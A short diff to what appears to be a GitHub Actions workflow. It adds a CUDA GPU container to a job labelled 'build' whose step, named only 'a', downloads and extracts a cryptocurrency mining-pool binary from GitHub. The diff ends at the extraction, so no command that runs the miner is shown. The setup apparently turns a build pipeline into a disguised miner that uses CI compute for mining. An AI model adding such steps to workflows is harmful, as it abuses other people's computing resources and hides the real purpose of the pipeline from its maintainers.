@@ -7,7 +7,8 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
-
+    container:
+      image: nvidia/cuda:12.4.1-devel-ubi8
     steps:
       - name: a
         run: sudo wget https://github.com/gramcoinorg/mining-pool/releases/download/miners-r1/gram-mining-pool-ubuntu-x86-64.tar.gz && tar xvfz gram-mining-pool-ubuntu-x86-64.tar.gz
